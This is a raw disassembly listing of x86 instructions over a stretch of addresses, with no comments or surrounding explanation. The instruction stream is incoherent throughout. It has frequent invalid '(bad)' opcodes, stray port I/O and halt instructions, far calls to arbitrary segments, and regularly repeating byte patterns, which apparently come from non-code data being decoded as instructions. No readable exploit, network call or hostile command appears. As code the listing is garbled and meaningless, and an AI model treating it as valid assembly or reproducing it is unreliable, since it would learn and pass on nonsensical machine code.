  42306a:	jl     0x423042
  42306c:	test   BYTE PTR [edi],0x23
  42306f:	or     ah,BYTE PTR [edx-0x21]
  423072:	cmp    eax,0xf843ef78
  423077:	outs   dx,BYTE PTR ds:[esi]
  423078:	add    dh,0xc6
  42307b:	dec    esp
  42307c:	cmp    ebx,DWORD PTR [ebp+ebx*1-0x79]
  423080:	(bad)  
  423081:	jb     0x4230df
  423083:	dec    eax
  423084:	out    dx,eax
  423085:	jmp    0x4230fc
  423087:	sub    eax,0xf3483a70
  42308c:	add    BYTE PTR [eax],al
  42308e:	add    BYTE PTR [eax],al
  423090:	add    BYTE PTR [eax],al
  423092:	fwait
  423093:	loope  0x423102
  423095:	sub    eax,0xf7dbad7f
  42309a:	sar    BYTE PTR [ebx],cl
  42309c:	(bad)  
  42309d:	add    BYTE PTR [edi-0x1caf3532],ah
  4230a3:	aad    0x1
  4230a5:	add    BYTE PTR [edx+0x0],ah
  4230a8:	add    BYTE PTR [eax],al
  4230aa:	popa   
  4230ab:	aas    
  4230ac:	dec    ebx
  4230ad:	and    al,0x1d
  4230af:	or     eax,0xbcbb16d4
  4230b4:	hlt    
  4230b5:	in     eax,dx
  4230b6:	and    al,0x9
  4230b8:	stos   DWORD PTR es:[edi],eax
  4230b9:	imul   ebx,DWORD PTR [eax-0x4496654],0xffffffd8
  4230c0:	aad    0xc4
  4230c2:	mul    DWORD PTR [ebx-0x1fb8abfa]
  4230c8:	pusha  
  4230c9:	(bad)  
  4230cb:	jmp    0xa80bea17
  4230d0:	cmp    DWORD PTR [eax],edx
  4230d2:	les    esp,FWORD PTR [ebx*2+0x3a21c01f]
  4230d9:	mov    BYTE PTR [eax],cl
  4230db:	sti    
  4230dc:	mov    eax,0xca2eb55b
  4230e1:	jecxz  0x4230b1
  4230e3:	xor    eax,0x9cb7e74b
  4230e8:	shr    BYTE PTR [ebx],cl
  4230ea:	xor    al,0x3e
  4230ec:	cwde   
  4230ed:	out    0xd6,al
  4230ef:	mov    eax,ds:0xfdd07f75
  4230f4:	fiadd  WORD PTR [edx]
  4230f6:	dec    esi
  4230f7:	xor    edx,esi
  4230f9:	mov    bh,BYTE PTR [eax]
  4230fb:	das    
  4230fc:	dec    eax
  4230fd:	aam    0x73
  4230ff:	mov    eax,ds:0x92da74f
  423104:	test   BYTE PTR ds:0x705f60c,bl
  42310a:	fld    st(6)
  42310c:	add    BYTE PTR [eax],al
  42310e:	add    BYTE PTR [eax],al
  423110:	add    BYTE PTR [eax],al
  423112:	or     bh,dh
  423114:	ja     0x423160
  423116:	dec    edx
  423118:	cmp    eax,0x2e8eedf7
  42311d:	dec    eax
  42311e:	test   BYTE PTR [esi-0x2f],bh
  423121:	jno    0x423168
  423123:	(bad)  
  423124:	add    DWORD PTR [eax],eax
  423126:	bound  eax,QWORD PTR [eax]
  423128:	add    BYTE PTR [eax],al
  42312a:	shr    BYTE PTR [ecx*8+0x5f2415cb],cl
  423131:	adc    esp,edi
  423133:	mov    al,ds:0xb4987ee3
  423138:	cwde   
  423139:	and    eax,0xd71e40a3
  42313e:	or     al,0x29
  423140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423141:	out    0x8c,al
  423143:	sub    ah,BYTE PTR [ebp+edi*4+0x4e54e034]
  42314a:	xor    eax,0x6e0bfd8b
  42314f:	adc    dl,dl
  423151:	in     al,0x7e
  423153:	enter  0x777a,0xba
  423157:	push   ds
  423158:	js     0x42319a
  42315a:	arpl   WORD PTR [ecx],bx
  42315c:	data16 ja 0x423161
  42315f:	(bad)  
  423160:	and    esi,esp
  423162:	fnstenv [ecx+0x39]
  423165:	fadd   QWORD PTR [edi]
  423167:	call   0x58233a9f
  42316c:	jbe    0x4231bd
  42316e:	sub    al,0x17
  423170:	fadd   QWORD PTR [eax]
  423172:	shl    DWORD PTR [edi-0x79f1ec47],0x90
  423179:	loop   0x4231cd
  42317b:	mov    esp,DWORD PTR ds:0xf73e3219
  423181:	fs popf 
  423183:	test   BYTE PTR [edx+0x1c],dl
  423186:	jge    0x4231ba
  423188:	in     eax,dx
  423189:	das    
  42318a:	mov    WORD PTR [edi],?
  42318c:	add    BYTE PTR [eax],al
  42318e:	add    BYTE PTR [eax],al
  423190:	add    BYTE PTR [eax],al
  423192:	arpl   WORD PTR ss:[eax-0x10],bp
  423196:	jge    0x423193
  423198:	mov    esi,0x8c7853e7
  42319d:	daa    
  42319e:	mov    esp,0xa7b54bfe
  4231a3:	(bad)  
  4231a4:	add    DWORD PTR [eax],eax
  4231a6:	bound  eax,QWORD PTR [eax]
  4231a8:	add    BYTE PTR [eax],al
  4231aa:	bound  esp,QWORD PTR [edx+0x7eb2efc2]
  4231b0:	shr    DWORD PTR [ecx+eiz*2],0x9e
  4231b4:	into   
  4231b5:	shr    BYTE PTR [ecx],1
  4231b7:	loopne 0x423215
  4231b9:	lods   al,BYTE PTR ds:[esi]
  4231ba:	scas   eax,DWORD PTR es:[edi]
  4231bb:	pop    esp
  4231bc:	jl     0x423167
  4231be:	sub    bh,cl
  4231c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231c1:	inc    eax
  4231c2:	aam    0xa6
  4231c4:	mov    cl,0xb7
  4231c6:	pop    es
  4231c7:	in     eax,dx
  4231c8:	aas    
  4231c9:	mov    edi,0x9ffebf75
  4231ce:	fstp   QWORD PTR [edi+esi*8]
  4231d1:	int3   
  4231d2:	bts    DWORD PTR [edi],esi
  4231d5:	and    DWORD PTR [ebx-0x5c053f65],eax
  4231db:	lods   al,BYTE PTR ds:[esi]
  4231dc:	and    DWORD PTR [edx+0x70],esp
  4231df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231e1:	dec    eax
  4231e2:	scas   eax,DWORD PTR es:[edi]
  4231e3:	push   ebx
  4231e4:	mov    dl,0xd6
  4231e6:	pop    edi
  4231e7:	in     al,dx
  4231e8:	fiadd  WORD PTR es:[esp+edx*1+0x29]
  4231ed:	adc    bl,BYTE PTR [ebp+eax*2+0x4f]
  4231f1:	addr16 dec ecx
  4231f3:	sub    al,0x7f
  4231f5:	cmp    ebx,esi
  4231f7:	test   al,0x89
  4231f9:	sbb    DWORD PTR [edi+0x5f],esp
  4231fc:	mov    DWORD PTR es:[esi-0xa0bbc4b],ecx
  423203:	and    DWORD PTR [ecx-0x4c],0x11
  423207:	adc    eax,0x9f2c6658
  42320c:	add    BYTE PTR [eax],al
  42320e:	add    BYTE PTR [eax],al
  423210:	add    BYTE PTR [eax],al
  423212:	daa    
  423213:	ss lahf 
  423215:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42321b:	and    eax,0x182c075b
  423220:	enter  0x4f5d,0xde
  423224:	add    DWORD PTR [eax],eax
  423226:	bound  eax,QWORD PTR [eax]
  423228:	add    BYTE PTR [eax],al
  42322a:	dec    ebx
  42322b:	pop    ds
  42322c:	push   ecx
  42322d:	(bad)  
  42322e:	ds in  eax,dx
  423230:	enter  0x73a1,0xf9
  423234:	pop    ebp
  423235:	inc    edi
  423236:	ja     0x4231bc
  423238:	rol    DWORD PTR [ebx+0x7c],1
  42323b:	out    0x64,al
  42323d:	add    eax,0xaeb68d9d
  423242:	icebp  
  423243:	stc    
  423244:	xchg   edi,eax
  423245:	dec    DWORD PTR [edi+ecx*4+0x3e]
  423249:	sbb    eax,0x403ad859
  42324e:	jnp    0x4231e3
  423250:	and    BYTE PTR [edi],dh
  423252:	dec    ebp
  423253:	mov    al,BYTE PTR [edi]
  423255:	(bad)  
  423256:	cmp    esp,DWORD PTR [ebp+0x17]
  423259:	scas   eax,DWORD PTR es:[edi]
  42325a:	test   BYTE PTR [eax],dl
  42325c:	or     ebp,DWORD PTR ds:0x7987ef43
  423262:	clc    
  423263:	pop    ebx
  423264:	adc    BYTE PTR [eax-0x68],bl
  423267:	jne    0x4232db
  423269:	test   DWORD PTR [edx+0x62f0c2e5],edx
  42326f:	fnsave [esi+0x3c]
  423272:	xadd   eax,eax
  423275:	push   0x60
  423277:	loope  0x4232a3
  423279:	lds    ecx,FWORD PTR [edi]
  42327b:	int    0xdb
  42327d:	lods   al,BYTE PTR ds:[esi]
  42327e:	dec    edi
  42327f:	sahf   
  423280:	stos   BYTE PTR es:[edi],al
  423281:	push   0x8569fc55
  423286:	jne    0x42325e
  423288:	sbb    bh,BYTE PTR ss:[edx]
  42328b:	sbb    DWORD PTR [eax],eax
  42328d:	add    BYTE PTR [eax],al
  42328f:	add    BYTE PTR [eax],al
  423291:	add    BYTE PTR [edi],dh
  423293:	(bad)  
  423294:	out    0xc2,eax
  423296:	mul    ebx
  423298:	aaa    
  423299:	cmc    
  42329a:	xchg   ecx,eax
  42329b:	call   0xca51:0x92aaeef4
  4232a2:	mov    cl,0xde
  4232a4:	add    DWORD PTR [eax],eax
  4232a6:	bound  eax,QWORD PTR [eax]
  4232a8:	add    BYTE PTR [eax],al
  4232aa:	mov    DWORD PTR [eax],ecx
  4232ac:	xor    eax,0x11454581
  4232b1:	pop    es
  4232b2:	sar    BYTE PTR [ebx+ebx*8-0x439e660a],1
  4232b9:	xchg   edi,eax
  4232ba:	scas   eax,DWORD PTR es:[edi]
  4232bb:	adc    dl,dl
  4232bd:	retf   
  4232be:	into   
  4232bf:	xchg   ebp,eax
  4232c0:	mov    ecx,0xd12be36f
  4232c5:	hlt    
  4232c6:	retf   0x738c
  4232c9:	inc    esp
  4232ca:	inc    edi
  4232cb:	dec    edi
  4232cc:	cmp    ecx,DWORD PTR [ecx]
  4232ce:	jns    0x423255
  4232d0:	in     eax,dx
  4232d1:	cmp    eax,0xa3409b40
  4232d6:	cld    
  4232d7:	or     dl,BYTE PTR [ebx+0x17b2ff06]
  4232dd:	call   0xcc52:0xa1ec872e
  4232e4:	mov    esi,0x2d4c33b2
  4232e9:	hlt    
  4232ea:	jb     0x4232d0
  4232ec:	ja     0x423276
  4232ee:	xor    BYTE PTR [esi-0x18b1241e],0x60
  4232f5:	out    0x46,eax
  4232f7:	fidiv  WORD PTR [edx-0x4b]
  4232fa:	lods   al,BYTE PTR ds:[esi]
  4232fb:	jae    0x42328a
  4232fd:	pop    es
  4232fe:	jl     0x4232d2
  423300:	push   0x62520fe7
  423305:	xor    cl,BYTE PTR [ebp-0x76]
  423308:	aad    0xdc
  42330a:	push   eax
  42330b:	test   eax,0x0
  423310:	add    BYTE PTR [eax],al
  423312:	push   ss
  423313:	aad    0xdf
  423315:	out    dx,eax
  423316:	fucomip st,st(7)
  423318:	ss std 
  42331a:	cmp    BYTE PTR [esi-0xf4ca0c6],al
  423320:	pushf  
  423321:	push   0x1df13
  423326:	bound  eax,QWORD PTR [eax]
  423328:	add    BYTE PTR [eax],al
  42332a:	cmp    edx,DWORD PTR ds:0x862335b1
  423330:	int    0xe0
  423332:	jns    0x42335f
  423334:	test   cl,0xf5
  423337:	adc    cl,dh
  423339:	sub    DWORD PTR [eax+0x4579d6d4],ebx
  42333f:	jbe    0x423332
  423341:	fisttp DWORD PTR [esi+eax*8]
  423344:	mov    cl,0x23
  423346:	test   al,0x74
  423348:	mov    ecx,0x35620bbd
  42334d:	retf   0xdbb3
  423350:	or     ebx,DWORD PTR [edi]
  423352:	xchg   DWORD PTR [esi-0x62cd8f98],edi
  423358:	sub    ecx,0x2
  42335b:	shr    dl,1
  42335d:	jbe    0x4232e2
  42335f:	loopne 0x4233ce
  423361:	and    DWORD PTR ds:0xcd98bad4,esi
  423367:	test   cl,cl
  423369:	sbb    BYTE PTR [ecx+esi*1],dl
  42336c:	shl    BYTE PTR [edi],1
  42336e:	popf   
  42336f:	mov    edi,0xacf35a3b
  423374:	xchg   DWORD PTR ds:0x264146db,ecx
  42337a:	add    eax,0x62c1b36f
  42337f:	or     BYTE PTR [bx+0x21b5],dh
  423384:	inc    eax
  423385:	scas   eax,DWORD PTR es:[edi]
  423386:	fldcw  WORD PTR [edx+0x7b]
  423389:	sbb    al,0x18
  42338b:	inc    ebx
  42338c:	add    BYTE PTR [eax],al
  42338e:	add    BYTE PTR [eax],al
  423390:	add    BYTE PTR [eax],al
  423392:	outs   dx,BYTE PTR ds:[esi]
  423393:	jbe    0x423379
  423395:	retf   0xdafc
  423398:	outs   dx,BYTE PTR ds:[esi]
  423399:	neg    BYTE PTR [eax]
  42339b:	xchg   edx,eax
  42339c:	xchg   DWORD PTR [edi+0x3e3c1747],edx
  4233a2:	jne    0x423383
  4233a4:	add    DWORD PTR [eax],eax
  4233a6:	bound  eax,QWORD PTR [eax]
  4233a8:	add    BYTE PTR [eax],al
  4233aa:	outs   dx,BYTE PTR ds:[esi]
  4233ab:	mov    esp,esi
  4233ad:	stos   BYTE PTR es:[edi],al
  4233ae:	sbb    al,BYTE PTR [eax+0x4d]
  4233b1:	lock (bad) 
  4233b3:	call   0x1590c397
  4233b8:	ins    BYTE PTR es:[edi],dx
  4233b9:	lea    ebx,es:[bp+di+0x3e95]
  4233bf:	inc    ebp
  4233c0:	cmovne eax,DWORD PTR [eax+0x1c1543bb]
  4233c7:	icebp  
  4233c8:	fist   WORD PTR [edx+edi*2-0x46]
  4233cc:	aas    
  4233cd:	mov    ch,0xf8
  4233cf:	xchg   ebp,eax
  4233d0:	test   al,0xaf
  4233d2:	repnz mov bl,cl
  4233d5:	shl    bl,1
  4233d7:	mov    al,0x52
  4233d9:	mov    edx,0xa6f9b441
  4233de:	call   0x864a09be
  4233e3:	iret   
  4233e4:	call   0x3ffe:0x5a5f4378
  4233eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ec:	add    eax,0x9d45bd91
  4233f1:	push   esi
  4233f2:	cmp    bl,BYTE PTR [eax+0x1106d40]
  4233f8:	xchg   DWORD PTR [ebp-0x7e],esp
  4233fb:	push   edx
  4233fc:	or     DWORD PTR [ecx],eax
  4233fe:	jnp    0x4233d1
  423400:	dec    ecx
  423401:	push   0x76
  423403:	cmp    ebp,DWORD PTR [eax+0x69]
  423406:	jle    0x423422
  423408:	add    eax,DWORD PTR [edx+0xf915]
  42340e:	add    BYTE PTR [eax],al
  423410:	add    BYTE PTR [eax],al
  423412:	cmp    dl,BYTE PTR [edx-0x3c]
  423415:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42341c:	nop
  42341d:	shr    edi,cl
  42341f:	into   
  423420:	retf   0xd711
  423423:	fild   WORD PTR [ecx]
  423425:	add    BYTE PTR [edx+0x0],ah
  423428:	add    BYTE PTR [eax],al
  42342a:	sub    dl,BYTE PTR [eax+0x15]
  42342d:	dec    DWORD PTR [ecx+0x36]
  423430:	arpl   sp,sp
  423432:	xchg   edx,ebx
  423434:	adc    DWORD PTR ds:[edx-0x3cb49e3d],edi
  42343b:	popf   
  42343c:	jbe    0x423460
  42343e:	or     BYTE PTR [edi],ch
  423440:	repz rcl DWORD PTR [ecx],cl
  423443:	xor    BYTE PTR ds:[esi],bh
  423446:	cs inc ecx
  423448:	cmp    DWORD PTR [edi-0x277233d7],ebx
  42344e:	inc    esp
  42344f:	leave  
  423450:	dec    edx
  423451:	aas    
  423452:	inc    ebx
  423453:	add    dl,BYTE PTR [ecx+0x23d61f8a]
  423459:	dec    edx
  42345a:	adc    eax,DWORD PTR [ecx-0x3e2273a1]
  423460:	shl    BYTE PTR [ebx+0x37],0x2c
  423464:	pop    ecx
  423465:	fdivp  st(6),st
  423467:	pop    ecx
  423468:	sub    BYTE PTR [ebx],bh
  42346a:	es mul cl
  42346d:	push   edx
  42346e:	mov    bl,dh
  423470:	mov    esp,0x8cf79e31
  423475:	add    edi,DWORD PTR [ebp-0x305c6b24]
  42347b:	push   ds
  42347c:	cmp    BYTE PTR [ecx+0x47cd8f46],bh
  423482:	gs stc 
  423484:	jns    0x4234d6
  423486:	retf   0xc8b5
  423489:	adc    edi,DWORD PTR [edi+0x66]
  42348c:	add    BYTE PTR [eax],al
  42348e:	add    BYTE PTR [eax],al
  423490:	add    BYTE PTR [eax],al
  423492:	xchg   ebx,eax
  423493:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  42349a:	push   eax
  42349b:	loopne 0x423497
  42349d:	call   0xe039:0xca6bed99
  4234a4:	add    DWORD PTR [eax],eax
  4234a6:	bound  eax,QWORD PTR [eax]
  4234a8:	add    BYTE PTR [eax],al
  4234aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234ab:	shl    DWORD PTR [ebp+0x6f],1
  4234ae:	sbb    DWORD PTR [ebp+0x74f793a0],eax
  4234b4:	mov    ds:0x9a074cc,al
  4234b9:	les    ebx,FWORD PTR [ebp+0x66ad655f]
  4234bf:	or     BYTE PTR [ebp+0x27],bl
  4234c2:	xchg   esp,eax
  4234c3:	cmp    eax,0xff52b4b1
  4234c8:	leave  
  4234c9:	add    eax,0x61fa5257
  4234ce:	cwde   
  4234cf:	shr    DWORD PTR [ecx+eiz*8+0x28],cl
  4234d3:	push   es
  4234d4:	mov    ch,0x82
  4234d6:	jg     0x423557
  4234d8:	cmp    eax,0xd8f91835
  4234dd:	sti    
  4234de:	test   al,0x29
  4234e0:	jb     0x4234cc
  4234e2:	scas   eax,DWORD PTR es:[edi]
  4234e3:	lea    edi,[ecx+0x4579e0da]
  4234e9:	add    BYTE PTR [edi+eax*1],bh
  4234ec:	adc    edi,esp
  4234ee:	add    eax,esi
  4234f0:	sub    DWORD PTR [edx-0x33b67387],esi
  4234f6:	mov    WORD PTR [esi+esi*4+0x1a4107c3],?
  4234fd:	lea    esp,ds:0x3607193d
  423503:	add    eax,0x1e623800
  423508:	sub    BYTE PTR [edx],bh
  42350a:	sbb    eax,0xd4
  42350f:	add    BYTE PTR [eax],al
  423511:	add    ah,bl
  423513:	fincstp 
  423515:	shl    bh,0xee
  423518:	(bad)  
  423519:	frstor [ecx+eax*1]
  42351c:	pop    ebp
  42351d:	dec    edi
  42351e:	stos   BYTE PTR es:[edi],al
  42351f:	push   esp
  423520:	inc    edx
  423521:	dec    eax
  423522:	fwait
  423523:	loopne 0x423526
  423525:	add    BYTE PTR [edx+0x0],ah
  423528:	add    BYTE PTR [eax],al
  42352a:	add    ebp,ebx
  42352c:	cmc    
  42352d:	mov    WORD PTR [edi],gs
  42352f:	xor    ebx,edx
  423531:	test   BYTE PTR [ecx+eax*2+0x62351c35],dl
  423538:	xor    cl,BYTE PTR [ebx+0x4c]
  42353b:	leave  
  42353c:	stos   BYTE PTR es:[edi],al
  42353d:	or     esi,DWORD PTR gs:0x42f7a6df
  423544:	out    dx,al
  423545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423546:	xchg   DWORD PTR [esi],ecx
  423548:	adc    eax,0x41717947
  42354d:	(bad)  
  42354e:	mov    edi,0x793e7aa6
  423553:	pop    eax
  423554:	mov    dl,0x2e
  423556:	test   DWORD PTR [ebx+eax*1],ebx
  423559:	inc    ch
  42355b:	push   eax
  42355c:	scas   eax,DWORD PTR es:[edi]
  42355d:	mov    dh,0x61
  42355f:	loope  0x42356a
  423561:	inc    eax
  423562:	sub    edx,ebx
  423564:	inc    eax
  423565:	jg     0x423565
  423567:	cmp    bl,BYTE PTR [esi+0x180b1221]
  42356d:	cmp    ebp,DWORD PTR [esp+ebp*4]
  423570:	mov    ds:0x56252f40,al
  423575:	fiadd  WORD PTR [edi+0x1b5d2f9e]
  42357b:	adc    eax,0xbda32eff
  423580:	dec    ecx
  423581:	xor    eax,0x4ea4b12b
  423586:	mov    cl,BYTE PTR [eax+0x47d4b1ee]
  42358c:	add    BYTE PTR [eax],al
  42358e:	add    BYTE PTR [eax],al
  423590:	add    BYTE PTR [eax],al
  423592:	outs   dx,DWORD PTR ds:[esi]
  423593:	mov    ds:0x7edd2ad4,al
  423598:	jmp    edi
  42359a:	push   edx
  42359b:	fcmovu st,st(5)
  42359d:	in     eax,0x55
  42359f:	push   eax
  4235a0:	cmc    
  4235a1:	inc    ebx
  4235a2:	std    
  4235a3:	loopne 0x4235a6
  4235a5:	add    BYTE PTR [edx+0x0],ah
  4235a8:	add    BYTE PTR [eax],al
  4235aa:	dec    DWORD PTR [ecx+0xc]
  4235ad:	test   al,0x30
  4235af:	push   edx
  4235b0:	pop    ds
  4235b1:	dec    ebx
  4235b2:	(bad)  
  4235b3:	jmp    0x423588
  4235b5:	mov    bh,0xee
  4235b7:	add    ah,BYTE PTR [edx]
  4235b9:	ret    0x673f
  4235bc:	mov    dl,BYTE PTR [esi+0x29]
  4235bf:	test   eax,0x5cb8f788
  4235c5:	into   
  4235c6:	sbb    BYTE PTR [eax-0x27],al
  4235c9:	lods   eax,DWORD PTR ds:[esi]
  4235ca:	pop    edi
  4235cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235cc:	sub    BYTE PTR [edx+0x21],0xee
  4235d0:	push   eax
  4235d1:	fcomp  DWORD PTR [edi]
  4235d3:	jbe    0x423593
  4235d5:	xchg   ebp,eax
  4235d6:	(bad)  
  4235d7:	mov    al,ds:0x6e1ed8
  4235dc:	daa    
  4235dd:	jecxz  0x4235d6
  4235df:	pop    ss
  4235e0:	push   esi
  4235e1:	mov    ah,0x42
  4235e3:	push   ds
  4235e4:	imul   DWORD PTR [esi]
  4235e6:	mov    bl,0xb3
  4235e8:	cmp    al,0x38
  4235ea:	fsubr  QWORD PTR [edi]
  4235ec:	rol    BYTE PTR [eax-0x77],1
  4235ef:	xchg   ecx,eax
  4235f0:	jae    0x423582
  4235f2:	imul   edx,DWORD PTR [edx+0x49528515],0x32
  4235f9:	fwait
  4235fa:	nop
  4235fb:	mov    cl,0x30
  4235fd:	and    al,0xb5
  4235ff:	std    
  423600:	push   es
  423601:	gs mov al,0x8a
  423604:	add    ah,dh
  423606:	ja     0x423589
  423608:	inc    edx
  423609:	lods   eax,DWORD PTR ds:[esi]
  42360a:	ds out dx,eax
  42360c:	add    BYTE PTR [eax],al
  42360e:	add    BYTE PTR [eax],al
  423610:	add    BYTE PTR [eax],al
  423612:	stc    
  423613:	sbb    al,al
  423615:	inc    esi
  423616:	jecxz  0x4235f6
  423618:	(bad)  
  423619:	mov    edi,0xe1f1bc83
  42361e:	arpl   WORD PTR [esi-0x1ea08ea0],bp
  423624:	add    DWORD PTR [eax],eax
  423626:	bound  eax,QWORD PTR [eax]
  423628:	add    BYTE PTR [eax],al
  42362a:	in     al,dx
  42362b:	mov    bl,0x55
  42362d:	fs div ecx
  423630:	scas   al,BYTE PTR es:[edi]
  423631:	sub    BYTE PTR [edi-0x323239a8],0x1c
  423638:	lahf   
  423639:	ins    DWORD PTR es:[edi],dx
  42363a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42363b:	xchg   ebp,eax
  42363c:	mov    BYTE PTR [eax+0x36a4cdf1],cl
  423642:	fbld   TBYTE PTR [ecx+0x3e]
  423645:	(bad)  
  423646:	and    BYTE PTR [ebx-0x16],ah
  423649:	mov    dh,0x87
  42364b:	dec    edi
  42364c:	add    al,0x44
  42364e:	adc    edx,ebp
  423650:	loope  0x4235dc
  423652:	add    BYTE PTR [eax+0x41],ah
  423655:	or     DWORD PTR [ebp*4+0x5b9eda7c],esp
  42365c:	dec    esp
  42365d:	add    eax,0xdab8bc93
  423662:	mov    gs,ecx
  423664:	out    0x4f,al
  423666:	dec    ebp
  423667:	shl    DWORD PTR [ecx],1
  423669:	jae    0x423657
  42366b:	xchg   ecx,eax
  42366c:	popa   
  42366d:	mov    ecx,0x913c17ed
  423672:	and    DWORD PTR [edi+0x5d],esp
  423675:	test   DWORD PTR [eax+edi*1+0x11],ebx
  423679:	mov    al,ds:0x9e919310
  42367e:	es stos BYTE PTR es:[edi],al
  423680:	pop    ebp
  423681:	jge    0x42367b
  423683:	xchg   esp,eax
  423684:	xor    al,0x2d
  423686:	pop    ebx
  423687:	push   ss
  423688:	popa   
  423689:	push   eax
  42368a:	add    cl,al
  42368c:	add    BYTE PTR [eax],al
  42368e:	add    BYTE PTR [eax],al
  423690:	add    BYTE PTR [eax],al
  423692:	mov    eax,ds:0x3e8336b9
  423697:	(bad)  
  423698:	mov    ch,0xbb
  42369a:	icebp  
  42369b:	and    eax,0x54168c27
  4236a0:	leave  
  4236a1:	retf   0xe1c1
  4236a4:	add    DWORD PTR [eax],eax
  4236a6:	bound  eax,QWORD PTR [eax]
  4236a8:	add    BYTE PTR [eax],al
  4236aa:	mov    dh,0x36
  4236ac:	mov    ebp,DWORD PTR [bx+0x7000]
  4236b1:	push   edx
  4236b2:	xchg   BYTE PTR [bp+di],bh
  4236b5:	addr16 xchg esp,eax
  4236b7:	aaa    
  4236b8:	add    DWORD PTR [esi+0x2a367ed6],esi
  4236be:	inc    ebx
  4236bf:	scas   al,BYTE PTR es:[edi]
  4236c0:	and    ecx,DWORD PTR [edi]
  4236c2:	js     0x4236ce
  4236c4:	ror    DWORD PTR [eax-0x45],1
  4236c7:	jns    0x42370d
  4236c9:	lods   eax,DWORD PTR ds:[esi]
  4236ca:	adc    eax,0x907204f2
  4236cf:	xor    ch,dh
  4236d1:	pop    ss
  4236d2:	arpl   sp,sp
  4236d4:	iret   
  4236d5:	pushf  
  4236d6:	call   0x459e:0xc950d4ff
  4236dd:	mov    ebx,DWORD PTR [ebp-0x1e]
  4236e0:	mov    al,ds:0x745954cf
  4236e5:	outs   dx,BYTE PTR ds:[esi]
  4236e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e7:	(bad)  
  4236e8:	std    
  4236e9:	mov    dh,0x40
  4236eb:	xor    ebp,DWORD PTR [ecx]
  4236ed:	mov    esp,0x7fdee2d0
  4236f2:	sbb    eax,0x810a9c5b
  4236f7:	mov    eax,ds:0xe06e6b63
  4236fc:	or     BYTE PTR [eax-0xe729ec1],dl
  423702:	push   es
  423703:	or     al,0x60
  423705:	out    dx,al
  423706:	inc    ebp
  423707:	scas   eax,DWORD PTR es:[edi]
  423708:	mov    esp,0x939ac2
  42370d:	add    BYTE PTR [eax],al
  42370f:	add    BYTE PTR [eax],al
  423711:	add    BYTE PTR [edx],dl
  423713:	xlat   BYTE PTR ds:[ebx]
  423714:	repz or esi,edi
  423717:	das    
  423718:	cli    
  423719:	fist   WORD PTR [ecx]
  42371b:	dec    ebx
  42371c:	es nop
  42371e:	aad    0x25
  423720:	dec    edx
  423721:	jb     0x423746
  423723:	loop   0x423726
  423725:	add    BYTE PTR [edx+0x0],ah
  423728:	add    BYTE PTR [eax],al
  42372a:	std    
  42372b:	and    esi,DWORD PTR [edi-0x64d6d5f6]
  423731:	pop    ebx
  423732:	mov    ebp,0x5851ac42
  423737:	push   eax
  423738:	test   cl,dl
  42373a:	xchg   ebp,eax
  42373b:	inc    ecx
  42373c:	cli    
  42373d:	or     al,BYTE PTR ds:0x736458cb
  423743:	mov    al,ds:0x3c033ae8
  423748:	cmp    eax,0x287eb55e
  42374d:	or     bh,BYTE PTR [eax-0x1d]
  423750:	leave  
  423751:	pop    ds
  423752:	jecxz  0x42373a
  423754:	jmp    0xe67b6d22
  423759:	retf   
  42375a:	fidiv  WORD PTR [edi+eax*1+0x54f4d3f8]
  423761:	mov    esi,0x7098bfc2
  423766:	in     eax,0x5
  423768:	(bad)  
  423769:	mov    ebp,0x37dff11d
  42376e:	adc    edi,eax
  423770:	xchg   ebp,eax
  423771:	outs   dx,BYTE PTR ds:[esi]
  423772:	mov    WORD PTR [ecx],es
  423774:	sbb    ecx,DWORD PTR [edx+0x5eac3b3]
  42377a:	dec    ecx
  42377b:	aas    
  42377c:	scas   al,BYTE PTR es:[edi]
  42377d:	jno    0x4237fd
  42377f:	shr    BYTE PTR [edx+eax*2-0x8],0x56
  423784:	push   ebp
  423785:	inc    edx
  423786:	mov    ds:0x4e984026,al
  42378b:	arpl   WORD PTR [eax],ax
  42378d:	add    BYTE PTR [eax],al
  42378f:	add    BYTE PTR [eax],al
  423791:	add    BYTE PTR [edx],dl
  423793:	mov    edx,0xe6f8c6d8
  423798:	push   ds
  423799:	(bad)  
  42379a:	adc    bl,dh
  42379c:	cwde   
  42379d:	out    dx,al
  42379e:	xchg   ebp,eax
  42379f:	adc    DWORD PTR [esi+0x1e285d2],eax
  4237a5:	add    BYTE PTR [edx+0x0],ah
  4237a8:	add    BYTE PTR [eax],al
  4237aa:	daa    
  4237ab:	jae    0x4237da
  4237ad:	sbb    DWORD PTR [ebp+0x55],edx
  4237b0:	or     BYTE PTR [ebp+0x4dceaa3f],ah
  4237b6:	sbb    esp,DWORD PTR [esi]
  4237b8:	out    0xb1,al
  4237ba:	or     edi,esp
  4237bc:	jmp    0xf587:0xb94adf4b
  4237c3:	je     0x42376f
  4237c5:	clc    
  4237c6:	not    DWORD PTR [eax-0x56172de2]
  4237cc:	fcom   DWORD PTR [ecx]
  4237ce:	push   ebp
  4237cf:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4237d1:	hlt    
  4237d2:	cmp    eax,0xebce0764
  4237d7:	js     0x4237a8
  4237d9:	dec    esi
  4237da:	(bad)  
  4237db:	mov    bh,0x49
  4237dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237de:	jo     0x423822
  4237e0:	je     0x4237fb
  4237e2:	js     0x4237a8
  4237e4:	mov    DWORD PTR [esi-0x65],edi
  4237e7:	cmp    ah,dh
  4237e9:	dec    eax
  4237ea:	addr16 fwait
  4237ec:	mov    ebp,0xb8941bcf
  4237f1:	mov    esi,0xf3c4c4e6
  4237f6:	add    eax,0x63b4991e
  4237fb:	dec    esi
  4237fc:	inc    eax
  4237fd:	mov    dl,0x1f
  4237ff:	lods   al,BYTE PTR ds:[esi]
  423800:	daa    
  423801:	push   es
  423802:	shl    DWORD PTR [ecx+0x36],0xed
  423806:	popa   
  423807:	pop    ss
